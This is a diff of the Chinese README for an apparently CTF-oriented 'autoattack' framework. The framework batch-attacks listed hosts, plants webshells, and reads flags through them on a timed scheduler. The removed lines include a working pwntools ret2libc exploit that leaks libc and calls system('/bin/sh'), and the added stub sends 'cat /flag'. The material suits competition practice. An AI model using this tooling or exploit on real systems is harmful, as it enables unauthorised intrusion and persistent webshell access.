@@ -71,8 +71,6 @@ pip install -r requirements.txt
 
 ## 配置数据库：
 
-> 使用 mysql而不是 sqlite ，是因为 sqlite 性能不够高，无法招架频繁的数据库操作
-
 1. 首先要在 mysql 中手动创建一个database ，名为 `autoattack` ，charset 使用 utf8 （或者直接用 docker-compose 起）
 
 2. 然后修改 `settings.py` ：
@@ -98,7 +96,7 @@ DATABASES = {
 
 ```python
 ADMIN_USERNAME = "admin"
-ADMIN_EMAIL = "root@autoattack.top"
+ADMIN_EMAIL = "root@inhann.top"
 ADMIN_PASSWORD = "admin"
 ```
 
@@ -110,9 +108,7 @@ python manage.py runserver
 
 ## Usage
 
-> 这里介绍下 example 目录下的代码
-
-### 假想环境：
+### demo 环境：
 
 `http://ant.com/eval.php` ：
 
@@ -124,80 +120,69 @@ python manage.py runserver
 
 
 
-### 配置 ip 列表
+### 配置 host 列表
 
-首先要配置 ip 列表，将所有要打的 ip 写到 `ip.txt` 中：
+首先要配置 host 列表，将所有要打的 host 写到 `hosts.txt` 中：
 
 ```
-ant.com
 192.168.56.101
+192.168.56.102
+192.168.56.103
+192.168.56.101:80
+192.168.56.102:80
+192.168.56.103:80
 ```
 
 
 
 ### 直接攻击，获取 flag
 
-`inhann/example/exp.py` 这个 demo 用来直接攻击网站获取 flag
+将 对靶机的操作都放到 `example` 目录下。
 
-核心逻辑在于继承 `AwdTask` ，override 一个 `exp()` ，然后把这个类作为参数送到 `Attack` 的构造函数里面
-
-然后只要调用 `attacker.attack()` ，就能完成批量的攻击
-
-
+`exp.py` 用来直接攻击网站获取 flag，核心逻辑在于继承 `AwdTask` ，override 一个 `exp()` 
 
 ### 写 webshell
 
-`inhann/example/write_webshell.py` 这个 demo 用来写webshell
-
-继承了  `AwdTask` ，override 一个 `write_webshell()` 
+`write_webshell.py` 用来写webshell，核心逻辑在于继承了  `AwdTask` ，override 一个 `write_webshell()` 
 
 通过 `PHP` 类，生成用来写 webshell 的代码，然后执行这个代码
 
 通过调用 `Example.update_and_test_available()` 方法，可以将 webshell 的相关信息写到数据库里面，并判断这个 webshell 是否能成功访问
 
+### 通过 webshell 进一步攻击
 
-
-### 通过 webshell 进行攻击
-
-`inhann/example/get_flag.py` 这个demo 用来通过 webshell 获取 flag
-
-继承了  `AwdTask` ，override 一个 `attack_use_webshell()` 
+`get_flag.py` 用来骑马攻击，核心逻辑在于继承了  `AwdTask` ，override 一个 `attack_use_webshell()` 
 
 直接调用 `Example.test_available_and_eval()` ，传入要打的 ip 和 执行的代码，这个函数会测试 webshell 是否可以访问，如果可以访问就会去执行 php 代码
 
-
-
 ### 配置定时任务
 
-在 `/urls.py` 的 `jobs` 中添加要定时运行的函数（解除注释就行）
-
-比如每分钟都 传一次 webshell ，并且通过 webshell 得到 flag ：
+在 `/jobs.py` 的 `jobs` 中添加要定时运行的函数（解除注释就行）：
 
 ```python
-from utils.django_job import Scheduler
+# jobs 打开定时任务管理器
 
+from utils.django_job import Scheduler
 scheduler = Scheduler.init()
 
-# import autoattack.example.exp
-import autoattack.example.write_webshell
-import autoattack.example.get_flag
+import autoattack.example.exp
+# import autoattack.example.write_webshell
+# import autoattack.example.get_flag
+# import autoattack.example.pwn
 
+# jobs 当中放的是一个个 tuple，表示要定时运行的函数和对应的 id
 jobs = [
-    # (autoattack.example.exp.attacker.attack,"example.exp"),
-    (autoattack.example.write_webshell.attacker.attack, "example.webshell"),
-    (autoattack.example.get_flag.attacker.attack, "example.getflag"),
+    (autoattack.example.exp.attacker.attack, "example.exp"),
+    # (autoattack.example.write_webshell.attacker.attack,"example.webshell"),
+    # (autoattack.example.get_flag.attacker.attack,"example.getflag"),
+    # (autoattack.example.pwn.attacker.attack,"example.exp"),
 ]
 jobs += [
 
 ]
-# scheduler.add_jobs(jobs,minutes=1)
-scheduler.add_jobs_cron(jobs, hour="10-12", minute="20,40")
+scheduler.add_jobs(jobs,seconds=5) #每5秒执行一次
+# scheduler.add_jobs_cron(jobs,hour="10-12",minute="20,40") #每天 10:20 10:40 11:20 11:40 12:20 12:40 执行一次
 ```
-
-`(inhann.example.write_webshell.attacker.attack,"example.webshell"),` 表示把 `inhann.example.write_webshell.attacker.attack` 这个函数加入定时任务当中，id 是 `example.webshell`
-
-如果使用 `add_jobs` 那么`minutes=1` 表示 `jobs` 里面的函数每 1 分钟执行一次
-如果使用 `add_jobs_cron` 那么 `hour="10-12",minute="20,40"` 表示 每天 10:20 10:40 11:20 11:40 12:20 12:40 运行 jobs 里面的内容
 
 
 
@@ -229,23 +214,21 @@ scheduler.add_jobs_cron(jobs, hour="10-12", minute="20,40")
 
 
 
-## 关于 `awdframework` 下的模块
+## 关于 `utils` 模块
 
 > 主要是为了支持快速批量打、方便生成 webshell 、方便 django 的开发而写的
 
-### `awdframework/awd.py` 
+### `utils/awd.py` 
 
-`awdframework/awd.py` 主要实现了批量攻击的功能，其底层逻辑是多线程
+`utils/awd.py` 主要实现了批量攻击的功能，其底层逻辑是多线程
 
 继承 `AwdTask` 类，覆写其 `exp()` 、`write_webshell()` 、`attack_use_webshell()` 等方法，然后把这个类作为参数传入 `Attacker` 的构造方法中，调用 `attacker.attack()` 就能攻击
 
 
 
+### `utils/django_job.py`
 
-
-### `awdframework/django_job.py`
-
-`awdframework/django_job.py` 主要是为了方便 django 的开发而写的 
+`utils/django_job.py` 主要是为了方便 django 的开发而写的 
 
 定义了一个 `WebshellModel` 抽象 model ，用来存储 webshell 相关信息
 
@@ -267,9 +250,9 @@ scheduler.add_jobs_cron(jobs, hour="10-12", minute="20,40")
 
 
 
-### `awdframework/webshell.py`
+### `utils/webshell.py`
 
-`awdframework/webshell.py` 用来生成 webshell
+`utils/webshell.py` 用来生成 webshell
 
 | methods in PHP      | details                                                      |
 | ------------------- | ------------------------------------------------------------ |
@@ -285,7 +268,7 @@ scheduler.add_jobs_cron(jobs, hour="10-12", minute="20,40")
 
 
 
-### `awdframework/encoder.py`
+### `utils/encoder.py`
 
 工具类，用来更方便地 encode 和 decode 
 
@@ -300,105 +283,53 @@ pwn 的话不用写 webshell ，因此只需要参考 `直接攻击，获取 fla
 `inhann/example/pwn.py` ：
 
 ```python
-from utils.awd import Attack, AwdTask
+from utils.awd import AwdAttack,AwdTask
+from utils.readwrite import readlines
 from os.path import dirname
 import pwn
-from LibcSearcher import LibcSearcher
-
 
 class Exp(AwdTask):
-    def __init__(self, ips, port=80):
-        super().__init__(ips, port)
 
-    def exp(self, ip):
-        sh = pwn.remote(ip, self.port)
+    def exp(self, host,port):
+        sh = pwn.remote(host, port)
         pwn.context.arch = "i386"
-        payload = pwn.flat(chr(0) * (0x2c - 0x25), 0x80)
-        sh.sendline(payload)
-        e = pwn.ELF("/home/autoattack/ctf")
-        write_got = e.got["write"]
-        write_plt = e.plt["write"]
-        # main_addr = e.symbols["main"]
-        main_addr = 0x08048825
-
-        payload = pwn.flat(chr(0) * (0xe7 + 4), write_plt, main_addr, 1, write_got, 4)
-        sh.sendline(payload)
-        sh.recvuntil("Correct\n")
-        write_addr = pwn.u32(sh.recv(4))
-        libc = LibcSearcher("write", write_addr)
-        libc_base = write_addr - libc.dump("write")
-        system_addr = libc_base + libc.dump("system")
-        bin_sh_addr = libc_base + libc.dump("str_bin_sh")
-
-        payload = pwn.flat(chr(0) * (0x2c - 0x25), 0x80)
-        sh.sendline(payload)
-
-        payload = pwn.flat(chr(0) * (0xe7 + 4), system_addr, 0xdeadbeef, bin_sh_addr)
-        sh.recvuntil("Correct\n")
-        sh.sendline(payload)
-
         # 本来是 interactive，现在直接执行命令
         # sh.interactive()
         sh.sendline(b"cat /flag")
-        result = sh.recvall()
+        result = sh.recv()
         print(result)
 
-
-attacker = Attack(f"{dirname(__file__)}\..\..\ip.txt", Exp, port=27782, thread_num=5)
-attacker.attack()
+hosts = readlines(f"{dirname(__file__)}/../../hosts.txt")
+attacker = AwdAttack(hosts=hosts,task_class=Exp,port=80,thread_num=5)
+# attacker.attack()
 ```
 
-
-
-然后把这个 attcker 的 attack 方法，添加到 `urls.py` 里面：
-
-```python
-from utils.django_job import Scheduler
-
-scheduler = Scheduler()
-scheduler.start()
-
-# import autoattack.example.exp
-# import autoattack.example.write_webshell
-# import autoattack.example.get_flag
-import autoattack.example.pwn
-
-jobs = [
-    # (autoattack.example.exp.attacker.attack,"example.exp"),
-    # (autoattack.example.write_webshell.attacker.attack,"example.webshell"),
-    # (autoattack.example.get_flag.attacker.attack,"web1.getflag"),
-    (autoattack.example.pwn.attacker.attack, "pwn1.exp"),
-]
-
-jobs += [
-
-]
-scheduler.add_jobs(jobs, minutes=1)
-```
+然后把这个 attcker 的 attack 方法，添加到 `jobs.py` 里面：
 
 
 
-## 多个场景怎么写
+## 多个场景
 
-参考 `example` 目录，再创建一个新目录就行
+1. 参考 `example` 目录，再创建一个新目录
 
-比如说，如果要打 web2，就建立一个 `web2` 目录，然后为了记录 webshell 信息，还要在 `models.py` 里面添加一个 model （继承 `WebshellModel` ，并且定义完了要 `Web2.register()` ）：
+比如说，如果要打 web2，就建立一个 `web2` 目录
+
+2. 在 `models.py` 里面添加一个 webshell model
+
+然后为了记录 webshell 信息，还要在 `models.py` 里面添加一个 model （继承 `WebshellModel` ，并且定义完了要 `Web2.register()` ）：
 
 ```python
 from utils.django_job import WebshellModel
 
-
 class Example(WebshellModel):
+    """
+    用于记录 webshell 信息
+    """
     pass
-
-
 Example.register()
-
 
 class Web2(WebshellModel):
     pass
-
-
 Web2.register()
 ```
 
